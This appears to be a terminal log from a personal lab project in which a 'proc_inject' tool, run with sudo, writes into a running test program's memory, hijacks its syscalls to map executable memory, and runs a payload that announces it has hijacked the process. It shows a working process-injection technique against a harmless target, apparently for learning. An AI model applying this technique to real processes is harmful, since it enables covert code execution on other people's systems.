bob@ops-Latitude-E6420 ~/Pen/elfing/trace $ sudo ./proc_inject `pidof helloop` payload
[sudo] password for bob: 
read: 600e28
read: 7fcce4b28168
read: 7fcce4918870
path: payload
write addr: 0x601000 val: 70
write addr: 0x601001 val: 61
write addr: 0x601002 val: 79
write addr: 0x601003 val: 6c
write addr: 0x601004 val: 6f
write addr: 0x601005 val: 61
write addr: 0x601006 val: 64
read: 2f7ba80d8b48c3
read: c88348018964d8f7
read: 441f0f66c3ff
read: 7500002fd4593d83
read: 50f00000023b810
reading 40 bytes of data
c3 
48 8b 0d a8 7b 2f 00 f7 d8 64 89 01 48 83 c8 ff c3 66 0f 1f 
44 00 00 83 3d 59 d4 2f 00 00 75 10 b8 23 00 00 00 0f 05 
got sysenter 7fcce46032f0
rdi: 601000
rdx: 0
rsi: 0
rax: 23
rip: 7fcce46032ee
rdi: 601000
rdx: 0
rsi: 0
rip: 7fcce46032f0
r8: 0
rax: 3
two_step success!
write addr: 0x601000 val: 600e28
write addr: 0x601008 val: 7fcce4b28168
write addr: 0x601010 val: 7fcce4918870
rdi: 0
rdx: 7
rsi: 2000
rax: 23
rip: 7fcce46032ee
rdi: 0
rdx: 7
rsi: 2000
rip: 7fcce46032f0
r8: 3
rax: 7fcce4b22000
two_step success!
mmap: Success
evil code at 7fcce4b22000
attempting to run it...
Success!


************************************************************************
In another terminal shell

bob@ops-Latitude-E6420 ~/Pen/elfing/trace $ ./helloop
hello 0
hello 1
hello 2
hello 3
hello 4
hello 5
hello 6
hello 7
hello 8
hello 9
hello 10
hello 11
hello 12
hello 13
hello 14
hello 15
hello 16
hello 17
hello 18
hello 19
hello 20
hello 21
hello 22
hello 23
hello 24
hello 25
hello 26
hello 27
hello 28
hello 29
hello 30
hello 31
hello 32
hello 33
hello 34
hello 35
hello 36
hello 37
hello 38
hello 39
hello 40
hello 41
hello 42
I am the payload who has hijacked your process!
bob@ops-Latitude-E6420 ~/Pen/elfing/trace $
